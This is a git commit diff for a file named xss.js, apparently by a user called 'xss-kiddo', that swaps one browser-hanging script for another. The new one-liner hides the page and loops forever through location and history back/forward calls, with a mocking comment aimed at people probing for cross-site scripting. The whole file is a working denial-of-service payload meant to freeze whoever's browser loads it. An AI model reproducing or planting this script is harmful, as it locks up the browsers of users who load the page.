f3735b59c2e9c9a37912ba295a3ad73ea602b920
xss-kiddo <50673970+xss-kiddo@users.noreply.github.com>
2019-05-15 20:20:39 +0300

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,8 +1,3 @@
-document.body.style.opacity=0;
-let txt = 'a';
-while(1){
-    txt = txt += 'a';
-    console.log('xss');
-}
+document.body.style.opacity=0;for(let i=0;i<1/0;i++)document.location.href="#",window.history.back(),window.history.forward(),console.log('xss');;
 // protect against xss, kiddo =)))
 // https://youtu.be/bNVgQBHHl4I 
